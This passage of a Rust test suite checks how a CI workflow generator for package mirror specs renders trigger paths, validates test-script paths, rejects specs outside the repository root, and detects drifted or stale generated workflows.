            ],
            "the base decides the target registry describe publishes to, got:\n{describe}"
        );

        // Red proof: the same package with the base's keys inlined instead of
        // extended. Without this the assertion above would pass for a renderer
        // that names `mirror-base.yml` unconditionally.
        let (standalone, _) = workflows_for(None);
        assert_eq!(
            trigger_entries(&standalone, "push"),
            vec!["buildifier/**", ".github/workflows/mirror-buildifier.yml"],
            "a spec that extends nothing watches nothing extra, got:\n{standalone}"
        );
    }

    #[test]
    fn a_base_inside_the_specs_own_subtree_adds_no_entry() {
        // The subtree glob already covers a base under the spec's own directory.
        // The sibling case is what keeps that check honest: `buildifier-extra/`
        // shares a prefix with `buildifier/` and is not under it.
        for (base_at, base_ref, expected) in [
            ("buildifier/base.yml", "./base.yml", vec!["buildifier/**"]),
            (
                "buildifier-extra/base.yml",
                "../buildifier-extra/base.yml",
                vec!["buildifier/**", "buildifier-extra/base.yml"],
            ),
        ] {
            let dir = tempdir().unwrap();
            write_file(dir.path(), base_at, EXTENDS_BASE);
            let child = write_file(
                dir.path(),
                "buildifier/mirror.yml",
                &extends_child("buildifier", Some(base_ref)),
            );
            generate(dir.path(), &[child], false).expect("the child spec must render");
            let workflow = std::fs::read_to_string(dir.path().join(".github/workflows/mirror-buildifier.yml")).unwrap();

            let mut expected = expected;
            expected.push(".github/workflows/mirror-buildifier.yml");
            assert_eq!(
                trigger_entries(&workflow, "push"),
                expected,
                "trigger for a spec extending {base_ref}, got:\n{workflow}"
            );
        }
    }

    #[test]
    fn the_drift_guard_watches_a_shared_base_once() {
        // The guard re-renders every spec, so a base edit changes every
        // generated workflow in the repository — the one change the guard was
        // blind to. Listing it once per child would be equally correct to GHA
        // and unreadable in the committed file.
        let dir = tempdir().unwrap();
        write_file(dir.path(), "mirror-base.yml", EXTENDS_BASE);
        let specs: Vec<PathBuf> = ["buildifier", "buildozer"]
            .iter()
            .map(|name| {
                write_file(
                    dir.path(),
                    &format!("{name}/mirror.yml"),
                    &extends_child(name, Some("../mirror-base.yml")),
                )
            })
            .collect();
        generate(dir.path(), &specs, false).expect("two specs sharing a base must render");

        let guard = std::fs::read_to_string(dir.path().join(".github/workflows/verify-generated.yml")).unwrap();
        for event in ["pull_request", "push"] {
            assert_eq!(
                trigger_entries(&guard, event),
                vec![
                    "buildifier/**",
                    "mirror-base.yml",
                    "buildozer/**",
                    ".github/workflows/**"
                ],
                "the guard's {event} trigger must cover the shared base exactly once, got:\n{guard}"
            );
        }
    }

    // ── `script:` paths ───────────────────────────────────────────────────────

    /// A spec whose one test is a Starlark `script:`, declared top-level.
    fn script_spec(script: &str) -> String {
        format!(
            "{SHFMT_SPEC}platforms:\n  linux/amd64:\n    runner: ubuntu-latest\ntests:\n  - name: smoke\n    script: {script}\n"
        )
    }

    /// The same, declared as a per-platform override — a second list of tests
    /// that nothing else validates.
    fn platform_script_spec(script: &str) -> String {
        format!(
            "{SHFMT_SPEC}platforms:\n  linux/amd64:\n    runner: ubuntu-latest\n    tests:\n      - name: smoke\n        script: {script}\n"
        )
    }

    /// Render a one-spec repository at `buildifier/mirror.yml`, optionally
    /// creating a script file at `create` first.
    fn render_with_script(spec_yaml: &str, create: Option<&str>) -> Result<(), MirrorError> {
        let dir = tempdir().unwrap();
        if let Some(at) = create {
            write_file(dir.path(), at, "ocx_assert(True)\n");
        }
        let spec = write_file(dir.path(), "buildifier/mirror.yml", spec_yaml);
        generate(dir.path(), &[spec], false)
    }

    /// The one message of a rejected render, or a panic naming what came back.
    fn only_spec_error(result: Result<(), MirrorError>) -> String {
        match result {
            Err(MirrorError::SpecInvalid(errors)) => {
                assert_eq!(errors.len(), 1, "one missing script, one message: {errors:?}");
                errors.into_iter().next().expect("just asserted one")
            }
            other => panic!("a missing test script must be a spec error, got: {other:?}"),
        }
    }

    #[test]
    fn a_test_script_that_does_not_exist_is_a_spec_error() {
        // Rendering a workflow that names a script nobody wrote is a green here
        // and a red test leg in someone else's CI run, after a publish attempt.
        render_with_script(
            &script_spec("buildifier/tests/smoke.star"),
            Some("buildifier/tests/smoke.star"),
        )
        .expect("a spec whose script exists must render");

        let missing = only_spec_error(render_with_script(&script_spec("buildifier/tests/smoke.star"), None));
        assert!(
            missing.contains("entry 'smoke' script not found: buildifier/tests/smoke.star")
                && missing.contains("resolves from the repository root as "),
            "the message must name the path and what it resolved against, got: {missing}"
        );
        assert!(
            !missing.contains("write "),
            "nothing exists anywhere, so there is no better path to suggest, got: {missing}"
        );

        // The near miss: `tests/smoke.star` inside `buildifier/mirror.yml` reads
        // as spec-relative and means repo-root-relative. Saying only "not found"
        // would leave the author staring at a file that is right there.
        let near_miss = only_spec_error(render_with_script(
            &script_spec("tests/smoke.star"),
            Some("buildifier/tests/smoke.star"),
        ));
        assert!(
            near_miss.contains("`script:` is repository-root-relative")
                && near_miss.contains("write buildifier/tests/smoke.star"),
            "the near miss must name the path that would have worked, got: {near_miss}"
        );
    }

    #[test]
    fn a_per_platform_test_script_is_checked_too() {
        // `platforms.<key>.tests` overrides the top-level list and is the only
        // list a container leg ever runs — nothing else validates it at all.
        render_with_script(
            &platform_script_spec("buildifier/tests/smoke.star"),
            Some("buildifier/tests/smoke.star"),
        )
        .expect("a per-platform script that exists must render");

        let missing = only_spec_error(render_with_script(
            &platform_script_spec("buildifier/tests/smoke.star"),
            None,
        ));
        assert!(
            missing.contains("platforms: 'linux/amd64': tests: entry 'smoke' script not found"),
            "the message must name the platform whose override it is, got: {missing}"
        );
    }

    #[test]
    fn a_base_outside_the_repository_root_is_rejected() {
        // `paths:` names files of the workflow's own repository, so a trigger
        // for an out-of-root base is one that can never fire — the same silent
        // failure as an out-of-root spec, one step further out.
        let outer = tempdir().unwrap();
        let repo = outer.path().join("repo");
        write_file(outer.path(), "shared/base.yml", EXTENDS_BASE);
        let child = write_file(
            &repo,
            "buildifier/mirror.yml",
            &extends_child("buildifier", Some("../../shared/base.yml")),
        );

        match generate(&repo, &[child], false) {
            Err(MirrorError::SpecUsageError(msg)) => {
                assert!(
                    msg.contains("base.yml") && msg.contains("--repo-root"),
                    "the error must name the base and the fix, got: {msg}"
                );
            }
            other => panic!("a base outside the root must be a usage error, got: {other:?}"),
        }
        assert!(
            !repo.join(".github/workflows").exists(),
            "nothing may be written when the spec set is rejected"
        );
    }

    #[test]
    fn the_drift_guard_records_every_spec_the_repository_has() {
        // `--spec` appends, so a guard naming a subset would re-render only that
        // subset and call the rest green. The committed guard is the record of
        // what the repository mirrors.
        let dir = tempdir().unwrap();
        generate(dir.path(), &two_spec_repo(dir.path()), false).unwrap();
        let guard = std::fs::read_to_string(dir.path().join(".github/workflows/verify-generated.yml")).unwrap();

        assert!(
            guard.contains(
                "ocx-mirror package pipeline generate ci --check --spec mirror.yml --spec py3.13/mirror.yml\n"
            ),
            "the guard must re-render every spec, got:\n{guard}"
        );
        assert!(
            guard.contains(
                "    paths:\n      - mirror.yml\n      - scripts/**\n      - tests/**\n      \
                 - metadata*.json\n      - py3.13/**\n      - .github/workflows/**\n"
            ),
            "the guard's triggers must be the union of the specs', got:\n{guard}"
        );
    }

    #[test]
    fn hand_editing_a_nested_workflow_reds_the_check_by_name() {
        let dir = tempdir().unwrap();
        let specs = two_spec_repo(dir.path());
        generate(dir.path(), &specs, false).unwrap();

        let edited = dir.path().join(".github/workflows/mirror-py3.13.yml");
        let mut content = std::fs::read_to_string(&edited).unwrap();
        content.push_str("\n# hand edit\n");
        std::fs::write(&edited, content).unwrap();

        match generate(dir.path(), &specs, true) {
            Err(MirrorError::RendererDrift(paths)) => {
                assert_eq!(
                    paths,
                    vec![".github/workflows/mirror-py3.13.yml"],
                    "only the hand-edited file may be reported"
                );
            }
            other => panic!("a hand-edited nested workflow must red, got: {other:?}"),
        }
    }

    #[test]
    fn dropping_a_spec_leaves_its_workflows_stale() {
        // Without the stale sweep the dropped spec's `mirror-py3.13.yml` keeps
        // running on schedule against a spec that no longer exists, and the
        // drift guard — which only ever compared files it renders — stays green.
        let dir = tempdir().unwrap();
        let specs = two_spec_repo(dir.path());
        generate(dir.path(), &specs, false).unwrap();

        // Hand-written workflows have no generated header and must be ignored.
        std::fs::write(dir.path().join(".github/workflows/release.yml"), "name: release\n").unwrap();

        match generate(dir.path(), &specs[..1], true) {
            Err(MirrorError::RendererDrift(paths)) => {
                assert_eq!(
                    paths,
                    vec![
                        // The committed guard still names the dropped spec —
                        // that is exactly how the repository records what it
                        // mirrors, so it drifts too.
                        ".github/workflows/verify-generated.yml",
                        ".github/workflows/announce-from-registry-py3.13.yml",
                        ".github/workflows/cascade-py3.13.yml",
                        ".github/workflows/describe-py3.13.yml",
                        ".github/workflows/mirror-py3.13.yml",
                        ".github/workflows/patch-py3.13.yml",
                    ],
                    "every workflow of the dropped spec is stale — and nothing else"
                );
            }
            other => panic!("dropping a spec must red on its leftover workflows, got: {other:?}"),
        }
    }

    #[test]
    fn two_specs_in_one_directory_are_rejected() {
        // Names derive from the directory, so these two would overwrite each
        // other — silently, which is the whole failure being fixed.
        let dir = tempdir().unwrap();
        let first = install_spec("mirror-minimal.yml", dir.path());
        let second = install_spec_at("mirror-ghcr-announce.yml", dir.path(), "other.yml");

        match generate(dir.path(), &[first, second], false) {
            Err(MirrorError::SpecUsageError(msg)) => {
                assert!(msg.contains("mirror.yml") && msg.contains("other.yml"), "got: {msg}");
            }
            other => panic!("two specs in one directory must be a usage error, got: {other:?}"),
        }
        assert!(
            !dir.path().join(".github/workflows").exists(),
            "nothing may be written when the spec set is rejected"
        );
    }

    #[test]
    fn a_spec_outside_the_repository_root_is_rejected() {
        let repo = tempdir().unwrap();
        let elsewhere = tempdir().unwrap();
        let outside = install_spec("mirror-minimal.yml", elsewhere.path());

        match generate(repo.path(), &[outside], false) {
            Err(MirrorError::SpecUsageError(msg)) => {
                assert!(msg.contains("--repo-root"), "the error must name the fix, got: {msg}");
            }
            other => panic!("a spec outside the root must be a usage error, got: {other:?}"),
        }
    }

    #[test]
    fn the_drift_guard_survives_one_spec_opting_out() {
        // One guard covers the whole repository, so the opt-out only takes
        // effect when every spec asks for it — otherwise a single
        // `allow_manual_edits` would disarm the guard for its siblings too.
        let opt_out = format!("{SHFMT_SPEC}allow_manual_edits: true\n");
        let nested = slot_at("py3.13/mirror.yml");

        let mixed = render(&[
            (root_slot(), spec_from_yaml(SHFMT_SPEC)),
            (nested.clone(), spec_from_yaml(&opt_out)),
        ]);
        assert!(
            mixed.contains_key(Path::new(".github/workflows/verify-generated.yml")),
            "one spec still wanting the guard is enough to emit it"
        );

        let all_out = render(&[
            (root_slot(), spec_from_yaml(&opt_out)),
            (nested, spec_from_yaml(&opt_out)),
        ]);
        assert!(
            !all_out.contains_key(Path::new(".github/workflows/verify-generated.yml")),
            "the guard is dropped only when every spec opts out"
        );
    }

    #[test]
    fn workflow_names_derive_from_the_spec_directory() {
        for (relative, suffix) in [
            ("mirror.yml", ""),
            ("py3.13/mirror.yml", "-py3.13"),
            ("a/b/mirror.yml", "-a-b"),
        ] {
            let slot = slot_at(relative);
            assert_eq!(slot.suffix(), suffix, "suffix for {relative}");
            assert_eq!(
                slot.workflow("mirror"),
                PathBuf::from(format!(".github/workflows/mirror{suffix}.yml")),
                "workflow path for {relative}"
            );
        }
    }

    /// Run `generate ci` with the repository root left to inference.
    fn generate_inferring_root(specs: &[PathBuf], check: bool) -> Result<(), MirrorError> {
        let cmd = GenerateCi {
            spec: specs.to_vec(),
            repo_root: None,
            check,
            format: None,
        };
        let rt = tokio::runtime::Runtime::new().unwrap();
        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        rt.block_on(async { cmd.execute(&printer).await })
    }

    /// A repository holding `count` package specs one level down, each with a
    /// repo-root-relative `tests: script:` — and, with `with_base`, an
    /// `extends:` base *above* the spec directory.
    ///
    /// The two are separate fixtures because they fail separately and the
    /// `extends:` check runs first: with a base present its error masks the
    /// doubled `script:` path entirely, so a fix that only repaired `extends:`
    /// would look green.
    fn nested_spec_repo(root: &Path, count: usize, with_base: bool) -> Vec<PathBuf> {
        std::fs::create_dir_all(root.join(".git")).expect("mark the repository root");
        if with_base {
            write_file(root, "mirror-base.yml", EXTENDS_BASE);
        }
        (0..count)
            .map(|i| {
                let name = format!("tool{i}");
                write_file(root, &format!("{name}/tests/smoke.star"), "ocx_assert(True)\n");
                let base = with_base.then_some("../mirror-base.yml");
                let spec = extends_child(&name, base).replace(
                    "  - name: version\n",
                    &format!("  - name: smoke\n    script: {name}/tests/smoke.star\n  - name: version\n"),
                );
                write_file(root, &format!("{name}/mirror.yml"), &spec)
            })
            .collect()
    }

    /// A single spec one level down must infer the *repository* root, not its
    /// own directory.
    ///
    /// Repro (`mirror-astral-sh`): `tests: script:` is documented and
    /// implemented as repo-root-relative, so an inferred root of `<repo>/tool0`
    /// resolved it as `<repo>/tool0/tool0/tests/smoke.star` — doubled segment —
    /// and the `extends:` base above the spec read as outside the repository.
    /// Every single-spec-in-a-subdirectory repo failed its own
    /// `verify-generated` drift guard. Multi-spec repos passed only because
    /// their common ancestor happened to be the real root, which is why this
    /// asserts both counts: one spec and three must infer the same root.
    #[test]
    fn a_nested_spec_infers_the_repository_root_whatever_the_spec_count() {
        // `(1, false)` is the `tests: script:` doubling on its own; `(1, true)`
        // adds the `extends:` base; `(3, true)` is the multi-spec repo that
        // used to pass by luck and must keep passing.
        for (count, with_base) in [(1, false), (1, true), (3, true)] {
            let case = format!("{count} spec(s), base above: {with_base}");
            let dir = tempdir().unwrap();
            let specs = nested_spec_repo(dir.path(), count, with_base);

            generate_inferring_root(&specs, false).unwrap_or_else(|e| panic!("{case} must render: {e}"));

            for i in 0..count {
                assert!(
                    dir.path()
                        .join(format!(".github/workflows/mirror-tool{i}.yml"))
                        .exists(),
                    "workflows must land at the repository root, not under the spec directory ({case})",
                );
            }
            // The generated guard has to pass against the same inference the
            // repository will run it with — the symptom was a repo that could
            // never satisfy its own drift check.
            generate_inferring_root(&specs, true)
                .unwrap_or_else(|e| panic!("the drift guard must pass for {case}: {e}"));
        }
    }

    #[test]
    fn the_repo_root_defaults_to_the_directory_the_specs_share() {
        // `generate ci --spec /elsewhere/repo/mirror.yml` has to write into that
        // repository. Defaulting the root to the process's own directory would
        // scatter generated workflows wherever the command happened to run.
        let dir = tempdir().unwrap();
        // Marked explicitly: without it the answer depends on whether TMPDIR
        // happens to sit inside a git repository, which is the difference
        // between exercising the git lookup and exercising the fallback.
        std::fs::create_dir_all(dir.path().join(".git")).unwrap();
        let spec = install_spec("mirror-minimal.yml", dir.path());
        let cmd = GenerateCi {
            spec: vec![spec],
            repo_root: None,
            check: false,
            format: None,
        };
        let rt = tokio::runtime::Runtime::new().unwrap();
        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        rt.block_on(async { cmd.execute(&printer).await }).unwrap();

        assert!(
            dir.path().join(".github/workflows/mirror.yml").exists(),
            "the workflows must land next to the spec"
        );
    }
}
